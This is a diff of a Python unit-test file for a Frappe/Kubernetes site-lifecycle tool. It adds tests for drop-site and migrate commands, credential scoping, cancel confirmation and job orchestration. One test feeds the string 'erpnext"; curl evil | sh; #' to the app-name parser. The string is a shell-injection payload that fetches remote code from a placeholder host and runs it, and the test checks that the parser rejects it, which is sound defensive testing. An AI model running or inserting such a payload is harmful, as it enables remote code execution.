@@ -1,23 +1,50 @@
 # Copyright (c) 2026, Los Favs and Contributors
 # See license.txt
 
+import frappe
 from types import SimpleNamespace
-from unittest.mock import MagicMock
+from unittest.mock import MagicMock, patch
 
-import pytest
+
 from frappe.tests import UnitTestCase
 
 from kubeport.tasks.site_tasks import (
+	_bench_drop_site_command,
+	_bench_migrate_command,
 	_bench_new_site_command,
 	_build_creds_secret_manifest,
+	_build_drop_creds_secret_manifest,
+	_build_drop_env,
 	_build_env,
-	_build_job_manifest,
+	_build_op_job_manifest,
 	_clone_reference_pod_spec,
 	_job_name,
 	_merge_env,
 	_parse_install_apps,
 	_safe_label_value,
 )
+
+
+def _create_manifest(ref_spec, *, force_create=False, install_apps=None, site_name="demo"):
+	"""Test helper: assemble a create-site Job manifest the same way the task does."""
+	bench_cmd = _bench_new_site_command(site_name, install_apps or [], force_create)
+	container_env = _build_env(
+		site_name=site_name,
+		db_type="mariadb",
+		creds_secret_name="ks-demo-aaaabbbbcccc-creds",
+		db_root_in_creds=True,
+		db_root_secret="",
+		db_root_secret_key="",
+	)
+	return _build_op_job_manifest(
+		job_name="ks-demo-abcdef123456",
+		namespace="ns",
+		site_docname=f"release-a/{site_name}",
+		operation_label="create-site",
+		container_command=bench_cmd,
+		container_env=container_env,
+		ref_spec=ref_spec,
+	)
 
 
 class UnitTestSiteHelpers(UnitTestCase):
@@ -46,13 +73,13 @@ class UnitTestSiteHelpers(UnitTestCase):
 		)
 
 	def test_parse_install_apps_rejects_shell_metacharacters(self):
-		with pytest.raises(ValueError):
+		with self.assertRaises(ValueError):
 			_parse_install_apps('erpnext"; curl evil | sh; #')
 
 	def test_parse_install_apps_rejects_uppercase_and_spaces(self):
-		with pytest.raises(ValueError):
+		with self.assertRaises(ValueError):
 			_parse_install_apps("ERPNext")
-		with pytest.raises(ValueError):
+		with self.assertRaises(ValueError):
 			_parse_install_apps("erp next")
 
 	def test_parse_install_apps_returns_empty_on_none_or_whitespace(self):
@@ -70,17 +97,6 @@ class UnitTestSiteHelpers(UnitTestCase):
 		self.assertIn('--install-app="erpnext"', cmd)
 		self.assertIn('--install-app="payments"', cmd)
 
-	def test_build_env_uses_postgres_root_user_for_postgres(self):
-		env = _build_env(
-			site_name="s1",
-			db_type="postgres",
-			creds_secret_name="job-creds",
-			db_root_in_creds=True,
-			db_root_secret="",
-			db_root_secret_key="",
-		)
-		db_root_user = next(e for e in env if e["name"] == "DB_ROOT_USER")
-		self.assertEqual(db_root_user["value"], "postgres")
 
 	def test_build_env_admin_password_always_references_creds_secret(self):
 		env = _build_env(
@@ -276,7 +292,7 @@ class UnitTestClonePodSpec(UnitTestCase):
 		self.assertNotIn("not-referenced", vol_names)
 
 	def test_clone_raises_when_sites_mount_is_missing(self):
-		with pytest.raises(RuntimeError):
+		with self.assertRaises(RuntimeError):
 			_clone_reference_pod_spec(self._fake_api_client(), self._ref_pod(False))
 
 
@@ -298,40 +314,14 @@ class UnitTestJobManifest(UnitTestCase):
 		}
 
 	def test_manifest_lifts_pod_level_fields(self):
-		manifest = _build_job_manifest(
-			job_name="ks-demo-abcdef123456",
-			namespace="ns",
-			site_docname="release-a/demo.example.com",
-			site_name="demo.example.com",
-			db_type="mariadb",
-			install_apps=["erpnext"],
-			force_create=False,
-			creds_secret_name="ks-demo-aaaabbbbcccc-creds",
-			db_root_in_creds=True,
-			db_root_secret="",
-			db_root_secret_key="",
-			ref_spec=self._ref_spec(),
-		)
+		manifest = _create_manifest(self._ref_spec(), install_apps=["erpnext"])
 		pod = manifest["spec"]["template"]["spec"]
 		self.assertEqual(pod["serviceAccountName"], "frappe-sa")
 		self.assertEqual(pod["imagePullSecrets"], [{"name": "registry-secret"}])
 		self.assertEqual(pod["securityContext"], {"fsGroup": 1000})
 
 	def test_manifest_container_includes_env_from_and_resources(self):
-		manifest = _build_job_manifest(
-			job_name="ks-demo-abcdef123456",
-			namespace="ns",
-			site_docname="release-a/demo",
-			site_name="demo",
-			db_type="mariadb",
-			install_apps=[],
-			force_create=False,
-			creds_secret_name="ks-demo-aaaabbbbcccc-creds",
-			db_root_in_creds=True,
-			db_root_secret="",
-			db_root_secret_key="",
-			ref_spec=self._ref_spec(),
-		)
+		manifest = _create_manifest(self._ref_spec())
 		container = manifest["spec"]["template"]["spec"]["containers"][0]
 		self.assertEqual(container["envFrom"], [{"configMapRef": {"name": "frappe-config"}}])
 		self.assertEqual(container["resources"], {"requests": {"cpu": "100m"}})
@@ -344,20 +334,7 @@ class UnitTestJobManifest(UnitTestCase):
 		"""
 		from kubeport.tasks.site_tasks import _JOB_ACTIVE_DEADLINE_SECONDS
 
-		manifest = _build_job_manifest(
-			job_name="ks-demo-abcdef123456",
-			namespace="ns",
-			site_docname="release-a/demo",
-			site_name="demo",
-			db_type="mariadb",
-			install_apps=[],
-			force_create=False,
-			creds_secret_name="ks-demo-aaaabbbbcccc-creds",
-			db_root_in_creds=True,
-			db_root_secret="",
-			db_root_secret_key="",
-			ref_spec=self._ref_spec(),
-		)
+		manifest = _create_manifest(self._ref_spec())
 		self.assertEqual(
 			manifest["spec"]["activeDeadlineSeconds"], _JOB_ACTIVE_DEADLINE_SECONDS,
 		)
@@ -370,44 +347,106 @@ class UnitTestJobManifest(UnitTestCase):
 		Regression guard for the broken Recreate path where the controller used
 		to reject Active unconditionally, hiding this end-to-end wiring.
 		"""
-		manifest = _build_job_manifest(
-			job_name="ks-demo-abcdef123456",
-			namespace="ns",
-			site_docname="release-a/demo",
-			site_name="demo",
-			db_type="mariadb",
-			install_apps=[],
-			force_create=True,
-			creds_secret_name="ks-demo-aaaabbbbcccc-creds",
-			db_root_in_creds=True,
-			db_root_secret="",
-			db_root_secret_key="",
-			ref_spec=self._ref_spec(),
-		)
+		manifest = _create_manifest(self._ref_spec(), force_create=True)
 		bench_cmd = manifest["spec"]["template"]["spec"]["containers"][0]["args"][0]
 		self.assertIn("--force", bench_cmd)
 
 	def test_manifest_site_env_wins_over_bench_env(self):
 		ref = self._ref_spec()
 		ref["container_env"] = [{"name": "SITE_NAME", "value": "WRONG"}]
-		manifest = _build_job_manifest(
-			job_name="ks-demo-abcdef123456",
-			namespace="ns",
-			site_docname="release-a/demo",
-			site_name="demo",
-			db_type="mariadb",
-			install_apps=[],
-			force_create=False,
-			creds_secret_name="ks-demo-aaaabbbbcccc-creds",
-			db_root_in_creds=True,
-			db_root_secret="",
-			db_root_secret_key="",
-			ref_spec=ref,
-		)
+		manifest = _create_manifest(ref)
 		env = manifest["spec"]["template"]["spec"]["containers"][0]["env"]
 		site_name_entries = [e for e in env if e["name"] == "SITE_NAME"]
 		self.assertEqual(len(site_name_entries), 1)
 		self.assertEqual(site_name_entries[0]["value"], "demo")
+
+	def test_manifest_uses_operation_label_as_container_name(self):
+		"""The operation_label arg controls the container name so logs and
+		pod inspection clearly identify which lifecycle op a Job represents.
+		"""
+		manifest = _build_op_job_manifest(
+			job_name="ks-demo-abcdef123456",
+			namespace="ns",
+			site_docname="release-a/demo",
+			operation_label="delete-site",
+			container_command="echo noop",
+			container_env=[],
+			ref_spec=self._ref_spec(),
+		)
+		container = manifest["spec"]["template"]["spec"]["containers"][0]
+		self.assertEqual(container["name"], "delete-site")
+
+	def test_drop_site_command_quotes_env_vars(self):
+		"""Drop-site command must reference shell-quoted env vars so a malformed
+		site_name (or DB password) cannot break out of the argv.
+		"""
+		cmd = _bench_drop_site_command("demo")
+		self.assertIn('"$SITE_NAME"', cmd)
+		self.assertIn('--root-login="$DB_ROOT_USER"', cmd)
+		self.assertIn('--root-password="$DB_ROOT_PASSWORD"', cmd)
+		self.assertIn("--no-backup", cmd)
+		self.assertIn("--force", cmd)
+		# Site name is never interpolated as plaintext into the command.
+		self.assertNotIn("demo", cmd.replace('"$SITE_NAME"', ""))
+
+	def test_drop_site_command_does_not_set_admin_password(self):
+		"""Drop-site does not need an admin password — it should not reference
+		ADMIN_PASSWORD anywhere in the command.
+		"""
+		cmd = _bench_drop_site_command("demo")
+		self.assertNotIn("ADMIN_PASSWORD", cmd)
+		self.assertNotIn("admin-password", cmd)
+
+	def test_migrate_command_uses_site_env_var(self):
+		"""Migrate command must use $SITE_NAME (validated, env-injected) and
+		not interpolate the raw site name into the shell string.
+		"""
+		cmd = _bench_migrate_command("demo")
+		self.assertEqual(cmd, 'bench --site "$SITE_NAME" migrate')
+		self.assertNotIn("demo", cmd)
+
+	def test_build_drop_env_omits_admin_password(self):
+		"""Drop-site env must not carry ADMIN_PASSWORD — it is a no-op for
+		drop-site and would expose a credential the Job does not need.
+		"""
+		env = _build_drop_env(
+			site_name="demo",
+			db_type="mariadb",
+			creds_secret_name="ks-demo-aaaabbbbcccc-creds",
+			db_root_in_creds=True,
+			db_root_secret="",
+			db_root_secret_key="",
+		)
+		names = {e["name"] for e in env}
+		self.assertNotIn("ADMIN_PASSWORD", names)
+		self.assertEqual(names, {"SITE_NAME", "DB_TYPE", "DB_ROOT_USER", "DB_ROOT_PASSWORD"})
+
+	def test_build_drop_env_uses_user_secret_when_provided(self):
+		env = _build_drop_env(
+			site_name="demo",
+			db_type="mariadb",
+			creds_secret_name=None,
+			db_root_in_creds=False,
+			db_root_secret="user-mariadb-secret",
+			db_root_secret_key="root-pw",
+		)
+		db_root = next(e for e in env if e["name"] == "DB_ROOT_PASSWORD")
+		self.assertEqual(
+			db_root["valueFrom"]["secretKeyRef"],
+			{"name": "user-mariadb-secret", "key": "root-pw"},
+		)
+
+	def test_build_drop_creds_secret_carries_only_db_root(self):
+		manifest = _build_drop_creds_secret_manifest(
+			secret_name="ks-demo-aaaabbbbcccc-creds",
+			namespace="ns",
+			site_docname="release-a/demo",
+			db_root_password="hunter2",
+		)
+		self.assertEqual(manifest["stringData"], {"DB_ROOT_PASSWORD": "hunter2"})
+		labels = manifest["metadata"]["labels"]
+		self.assertIn("kubeport.io/frappe-site", labels)
+		self.assertIn("app.kubernetes.io/managed-by", labels)
 
 
 class UnitTestOperationTokenGuard(UnitTestCase):
@@ -437,6 +476,25 @@ class UnitTestOperationTokenGuard(UnitTestCase):
 		with patch("kubeport.tasks.site_tasks.frappe.db.get_value") as mock_get:
 			mock_get.return_value = {"operation_token": "token", "status": "In Progress"}
 			self.assertTrue(_site_operation_matches("site", "token", "In Progress"))
+
+	def test_site_operation_matches_accepts_deleting_and_migrating(self):
+		"""The guard is reused across all in-flight operations — a token-match
+		on Deleting / Migrating must succeed the same way it does on In Progress.
+		"""
+		from unittest.mock import patch
+
+		from kubeport.tasks.site_tasks import _site_operation_matches
+
+		for status in ("Deleting", "Migrating"):
+			with patch("kubeport.tasks.site_tasks.frappe.db.get_value") as mock_get:
+				mock_get.return_value = {"operation_token": "token", "status": status}
+				self.assertTrue(
+					_site_operation_matches("site", "token", status),
+					f"guard should accept matching token for status={status!r}",
+				)
+				# And must reject a stale create-time token if the row has moved
+				# on to Deleting/Migrating (different expected_status).
+				self.assertFalse(_site_operation_matches("site", "token", "In Progress"))
 
 
 def _fake_frappe_site_doc(site_name: str = "demo.example.com") -> MagicMock:
@@ -499,7 +557,9 @@ class UnitTestCreateSiteTask(UnitTestCase):
 		applied: list[tuple[str, dict]] = []
 
 		def _apply(_api_client, manifest, _ns):
-			applied.append((manifest["kind"], manifest))
+			from copy import deepcopy
+
+			applied.append((manifest["kind"], deepcopy(manifest)))
 
 		with patch.object(site_tasks, "_site_operation_matches", return_value=True), \
 			patch.object(site_tasks, "frappe") as mock_frappe, \
@@ -561,8 +621,8 @@ class UnitTestCreateSiteTask(UnitTestCase):
 
 		# Doc got its job-bookkeeping fields set.
 		set_fields = {call.args[0] for call in doc.db_set.call_args_list}
-		self.assertIn("creation_job_name", set_fields)
-		self.assertIn("creation_job_token", set_fields)
+		self.assertIn("operation_job_name", set_fields)
+		self.assertIn("operation_job_token", set_fields)
 
 	def test_create_site_task_deletes_orphan_job_when_token_superseded_after_apply(self):
 		"""If the doc is cancelled/deleted/force-recreated between our first
@@ -630,8 +690,8 @@ class UnitTestCreateSiteTask(UnitTestCase):
 
 		# The superseded worker must NOT record job bookkeeping on the doc.
 		set_fields = {call.args[0] for call in doc.db_set.call_args_list}
-		self.assertNotIn("creation_job_name", set_fields)
-		self.assertNotIn("creation_job_token", set_fields)
+		self.assertNotIn("operation_job_name", set_fields)
+		self.assertNotIn("operation_job_token", set_fields)
 
 	def test_create_site_task_marks_failed_and_cleans_up_secret_on_exception(self):
 		from unittest.mock import patch
@@ -810,8 +870,8 @@ class UnitTestControllerValidation(UnitTestCase):
 				"admin_password": "pw",
 				"db_type": "mariadb",
 				"force_create": 0,
-				"creation_job_name": "",
-				"creation_job_token": "",
+				"operation_job_name": "",
+				"operation_job_token": "",
 				"operation_token": "",
 				"db_root_secret_key": "",
 				"status_detail": "",
@@ -873,7 +933,7 @@ class UnitTestControllerValidation(UnitTestCase):
 			mock_frappe.throw.side_effect = Exception("validation error")
 
 			doc.is_new = lambda: True
-			with pytest.raises(Exception, match="validation error"):
+			with self.assertRaises(Exception):
 				doc.validate()
 
 			# frappe.throw should have been called with a message about the status
@@ -900,3 +960,362 @@ class UnitTestControllerValidation(UnitTestCase):
 			# frappe.throw should not have been called with a release-status message
 			for call_args in mock_frappe.throw.call_args_list:
 				self.assertNotIn("deployed", call_args.args[0].lower())
+
+
+class UnitTestOnTrashCleanup(UnitTestCase):
+	"""H3: on_trash enqueues cancel whenever a Job pointer exists."""
+
+	def _doc(self, **overrides):
+		from kubeport.kubeport.doctype.frappe_site.frappe_site import FrappeSite
+		# Build a stub doc that mimics the surface on_trash uses.
+		doc = MagicMock(spec=FrappeSite)
+		doc.status = overrides.get("status", "Failed")
+		doc.operation_job_name = overrides.get("operation_job_name", "ks-demo-abc123abc123")
+		doc.cluster = overrides.get("cluster", "cluster-a")
+		doc.namespace = overrides.get("namespace", "ns")
+		# bind the real on_trash to the mock doc so we exercise the controller logic.
+		doc.on_trash = FrappeSite.on_trash.__get__(doc, FrappeSite)
+		return doc
+
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
+	def test_on_trash_enqueues_cancel_for_failed_row_with_job(self, mock_enqueue):
+		doc = self._doc(status="Failed", operation_job_name="ks-demo-abc123abc123")
+		doc.on_trash()
+		mock_enqueue.assert_called_once()
+		_args, kwargs = mock_enqueue.call_args
+		self.assertEqual(kwargs["job_name"], "ks-demo-abc123abc123")
+		self.assertEqual(kwargs["cluster"], "cluster-a")
+		self.assertEqual(kwargs["namespace"], "ns")
+
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
+	def test_on_trash_no_enqueue_for_failed_row_without_job(self, mock_enqueue):
+		doc = self._doc(status="Failed", operation_job_name=None)
+		doc.on_trash()
+		mock_enqueue.assert_not_called()
+
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
+	def test_on_trash_still_enqueues_for_in_flight_with_job(self, mock_enqueue):
+		# Regression guard: existing in-flight cleanup branch still works.
+		doc = self._doc(status="In Progress", operation_job_name="ks-demo-deadbeef0000")
+		doc.on_trash()
+		mock_enqueue.assert_called_once()
+
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
+	def test_on_trash_no_enqueue_for_draft_row(self, mock_enqueue):
+		doc = self._doc(status="Draft", operation_job_name=None)
+		doc.on_trash()
+		mock_enqueue.assert_not_called()
+
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
+	def test_on_trash_refuses_migrating_row(self, mock_enqueue):
+		doc = self._doc(status="Migrating", operation_job_name="ks-demo-abc123abc123")
+		with self.assertRaises(frappe.ValidationError):
+			doc.on_trash()
+		mock_enqueue.assert_not_called()
+
+
+class UnitTestCancelSiteConfirmation(UnitTestCase):
+	"""H1: cancel_site requires confirm_destructive when status is Migrating."""
+
+	def _doc(self, **overrides):
+		from kubeport.kubeport.doctype.frappe_site.frappe_site import FrappeSite
+
+		doc = MagicMock(spec=FrappeSite)
+		doc.name = overrides.get("name", "rel-a/demo")
+		doc.status = overrides.get("status", "Migrating")
+		doc.operation_job_name = overrides.get("operation_job_name", "ks-demo-abc123abc123")
+		doc.cluster = overrides.get("cluster", "cluster-a")
+		doc.namespace = overrides.get("namespace", "ns")
+		doc.site_name = overrides.get("site_name", "demo")
+		doc.cancel_site = FrappeSite.cancel_site.__get__(doc, FrappeSite)
+		return doc
+
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.session")
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.publish_realtime")
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.msgprint")
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
+	def test_cancel_migrating_throws_without_confirm(
+		self,
+		mock_enqueue,
+		mock_msgprint,
+		mock_publish,
+		mock_session,
+	):
+		mock_session.user = "alice@example.com"
+		doc = self._doc(status="Migrating")
+		with self.assertRaises(frappe.ValidationError):
+			doc.cancel_site()
+		mock_enqueue.assert_not_called()
+		mock_msgprint.assert_not_called()
+		mock_publish.assert_not_called()
+
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.session")
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.publish_realtime")
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.msgprint")
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
+	def test_cancel_migrating_succeeds_with_confirm(
+		self,
+		mock_enqueue,
+		mock_msgprint,
+		mock_publish,
+		mock_session,
+	):
+		mock_session.user = "alice@example.com"
+		doc = self._doc(status="Migrating")
+		doc.cancel_site(confirm_destructive=True)
+		mock_enqueue.assert_called_once()
+		detail_calls = [
+			c for c in doc.db_set.call_args_list
+			if c.args and c.args[0] == "status_detail"
+		]
+		self.assertTrue(detail_calls, "expected a status_detail db_set call")
+		detail_value = detail_calls[-1].args[1]
+		self.assertIn("destructive cancel acknowledged", detail_value)
+		self.assertIn("alice@example.com", detail_value)
+
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.session")
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.publish_realtime")
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.msgprint")
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
+	def test_cancel_in_progress_does_not_require_confirm(
+		self,
+		mock_enqueue,
+		mock_msgprint,
+		mock_publish,
+		mock_session,
+	):
+		mock_session.user = "alice@example.com"
+		doc = self._doc(status="In Progress")
+		doc.cancel_site()
+		mock_enqueue.assert_called_once()
+
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.session")
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.publish_realtime")
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.msgprint")
+	@patch("kubeport.kubeport.doctype.frappe_site.frappe_site.frappe.enqueue")
+	def test_cancel_deleting_does_not_require_confirm(
+		self,
+		mock_enqueue,
+		mock_msgprint,
+		mock_publish,
+		mock_session,
+	):
+		mock_session.user = "alice@example.com"
+		doc = self._doc(status="Deleting")
+		doc.cancel_site()
+		mock_enqueue.assert_called_once()
+
+
+class UnitTestRunSiteOp(UnitTestCase):
+	"""D1: orchestrator behavior under stubbed K8s apply calls."""
+
+	def _config(self, op_kind="create", expected_status="In Progress"):
+		from kubeport.tasks.site_tasks import SiteOpConfig
+
+		labels = {
+			"create": ("create-site", "Frappe Site Job Submission Failed", "Job submission failed"),
+			"delete": ("delete-site", "Frappe Site Drop Submission Failed", "Drop-site Job submission failed"),
+			"migrate": ("migrate-site", "Frappe Site Migrate Submission Failed", "Migrate Job submission failed"),
+		}
+		container_label, failure_log_title, failure_detail_prefix = labels[op_kind]
+		return SiteOpConfig(
+			op_kind=op_kind,
+			expected_status=expected_status,
+			container_label=container_label,
+			failure_log_title=failure_log_title,
+			failure_detail_prefix=failure_detail_prefix,
+		)
+
+	def _doc(self, **overrides):
+		from kubeport.kubeport.doctype.frappe_site.frappe_site import FrappeSite
+
+		doc = MagicMock(spec=FrappeSite)
+		doc.name = overrides.get("name", "rel-a/demo")
+		doc.bench_release = overrides.get("bench_release", "rel-a")
+		doc.site_name = overrides.get("site_name", "demo")
+		doc.db_type = overrides.get("db_type", "mariadb")
+		doc.db_root_secret = overrides.get("db_root_secret", "")
+		doc.db_root_secret_key = overrides.get("db_root_secret_key", "mariadb-root-password")
+		doc.install_apps = overrides.get("install_apps", "")
+		doc.force_create = overrides.get("force_create", False)
+		doc.get_password = MagicMock(return_value="pw")
+		return doc
+
+	def _stub_release(self):
+		return SimpleNamespace(
+			cluster="cluster-a",
+			namespace="ns",
+			release_name="rel-a",
+		)
+
+	def _ref_spec(self):
+		return {
+			"image": "img:1",
+			"pod_level": {},
+			"container_env": [],
+			"container_env_from": [],
+			"container_resources": None,
+			"container_security_context": None,
+			"volume_mounts": [],
+			"volumes": [],
+		}
+
+	@patch("kubeport.tasks.site_tasks.frappe.get_doc")
+	@patch("kubeport.tasks.site_tasks._site_operation_matches")
+	def test_orchestrator_exits_early_when_token_superseded(
+		self,
+		mock_matches,
+		mock_get_doc,
+	):
+		from kubeport.tasks.site_tasks import _run_site_op
+
+		mock_matches.return_value = False
+		_run_site_op(
+			site_docname="rel-a/demo",
+			operation_token="t1",
+			config=self._config("create"),
+			build_command=lambda doc: "echo noop",
+			build_env=lambda doc, secret: [],
+		)
+		mock_get_doc.assert_not_called()
+
+	@patch("kubeport.tasks.site_tasks.apply_resource")
+	@patch("kubeport.tasks.site_tasks._clone_reference_pod_spec")
+	@patch("kubeport.tasks.site_tasks._select_site_discovery_pod")
+	@patch("kubeport.tasks.site_tasks.get_k8s_api_client")
+	@patch("kubeport.tasks.site_tasks.frappe.publish_realtime")
+	@patch("kubeport.tasks.site_tasks.frappe.get_doc")
+	@patch("kubeport.tasks.site_tasks._site_operation_matches")
+	def test_orchestrator_happy_path_creates_secret_then_job_then_sets_tokens(
+		self,
+		mock_matches,
+		mock_get_doc,
+		mock_publish,
+		mock_get_api_client,
+		mock_select_pod,
+		mock_clone_spec,
+		mock_apply,
+	):
+		from kubeport.tasks.site_tasks import _run_site_op
+
+		mock_matches.side_effect = [True, True]
+		doc = self._doc()
+		mock_get_doc.side_effect = [doc, self._stub_release()]
+		mock_clone_spec.return_value = self._ref_spec()
+
+		with patch("kubernetes.client.BatchV1Api") as mock_batch_api, \
+			patch("kubernetes.client.CoreV1Api"):
+			mock_batch_api.return_value.read_namespaced_job.return_value = SimpleNamespace(
+				metadata=SimpleNamespace(uid="job-uid-123"),
+			)
+			_run_site_op(
+				site_docname="rel-a/demo",
+				operation_token="t1",
+				config=self._config("create"),
+				build_command=lambda doc: "bench new-site x",
+				build_env=lambda doc, secret: [{"name": "SITE_NAME", "value": "demo"}],
+				build_creds_secret=lambda doc, job_name: {
+					"apiVersion": "v1",
+					"kind": "Secret",
+					"type": "Opaque",
+					"metadata": {"name": f"{job_name}-creds", "namespace": "ns", "labels": {}},
+					"stringData": {"ADMIN_PASSWORD": "pw"},
+				},
+			)
+
+		self.assertEqual(mock_apply.call_count, 3)
+		set_keys = [c.args[0] for c in doc.db_set.call_args_list]
+		self.assertIn("operation_job_name", set_keys)
+		self.assertIn("operation_job_token", set_keys)
+		mock_publish.assert_called_once()
+
+	@patch("kubeport.tasks.site_tasks._best_effort_delete_secret")
+	@patch("kubeport.tasks.site_tasks._best_effort_delete_job")
+	@patch("kubeport.tasks.site_tasks.apply_resource")
+	@patch("kubeport.tasks.site_tasks._clone_reference_pod_spec")
+	@patch("kubeport.tasks.site_tasks._select_site_discovery_pod")
+	@patch("kubeport.tasks.site_tasks.get_k8s_api_client")
+	@patch("kubeport.tasks.site_tasks.frappe.publish_realtime")
+	@patch("kubeport.tasks.site_tasks.frappe.get_doc")
+	@patch("kubeport.tasks.site_tasks._site_operation_matches")
+	def test_orchestrator_post_apply_token_mismatch_deletes_orphan_resources(
+		self,
+		mock_matches,
+		mock_get_doc,
+		mock_publish,
+		mock_get_api_client,
+		mock_select_pod,
+		mock_clone_spec,
+		mock_apply,
+		mock_delete_job,
+		mock_delete_secret,
+	):
+		from kubeport.tasks.site_tasks import _run_site_op
+
+		mock_matches.side_effect = [True, False]
+		doc = self._doc()
+		mock_get_doc.side_effect = [doc, self._stub_release()]
+		mock_clone_spec.return_value = self._ref_spec()
+
+		with patch("kubernetes.client.BatchV1Api") as mock_batch_api, \
+			patch("kubernetes.client.CoreV1Api"):
+			mock_batch_api.return_value.read_namespaced_job.return_value = SimpleNamespace(
+				metadata=SimpleNamespace(uid="job-uid-123"),
+			)
+			_run_site_op(
+				site_docname="rel-a/demo",
+				operation_token="t1",
+				config=self._config("create"),
+				build_command=lambda doc: "bench new-site x",
+				build_env=lambda doc, secret: [],
+				build_creds_secret=lambda doc, job_name: {
+					"apiVersion": "v1",
+					"kind": "Secret",
+					"type": "Opaque",
+					"metadata": {"name": f"{job_name}-creds", "namespace": "ns", "labels": {}},
+					"stringData": {"ADMIN_PASSWORD": "pw"},
+				},
+			)
+
+		mock_delete_job.assert_called_once()
+		mock_delete_secret.assert_called_once()
+		set_keys = [c.args[0] for c in doc.db_set.call_args_list]
+		self.assertNotIn("operation_job_name", set_keys)
+		mock_publish.assert_not_called()
+
+	@patch("kubeport.tasks.site_tasks.apply_resource")
+	@patch("kubeport.tasks.site_tasks._clone_reference_pod_spec")
+	@patch("kubeport.tasks.site_tasks._select_site_discovery_pod")
+	@patch("kubeport.tasks.site_tasks.get_k8s_api_client")
+	@patch("kubeport.tasks.site_tasks.frappe.publish_realtime")
+	@patch("kubeport.tasks.site_tasks.frappe.get_doc")
+	@patch("kubeport.tasks.site_tasks._site_operation_matches")
+	def test_orchestrator_skips_secret_when_build_creds_secret_returns_none(
+		self,
+		mock_matches,
+		mock_get_doc,
+		mock_publish,
+		mock_get_api_client,
+		mock_select_pod,
+		mock_clone_spec,
+		mock_apply,
+	):
+		from kubeport.tasks.site_tasks import _run_site_op
+
+		mock_matches.side_effect = [True, True]
+		doc = self._doc()
+		mock_get_doc.side_effect = [doc, self._stub_release()]
+		mock_clone_spec.return_value = self._ref_spec()
+
+		with patch("kubernetes.client.BatchV1Api"), patch("kubernetes.client.CoreV1Api"):
+			_run_site_op(
+				site_docname="rel-a/demo",
+				operation_token="t1",
+				config=self._config("migrate", expected_status="Migrating"),
+				build_command=lambda doc: "bench --site x migrate",
+				build_env=lambda doc, secret: [{"name": "SITE_NAME", "value": "demo"}],
+				build_creds_secret=None,
+			)
+
+		self.assertEqual(mock_apply.call_count, 1)
+		mock_publish.assert_called_once()
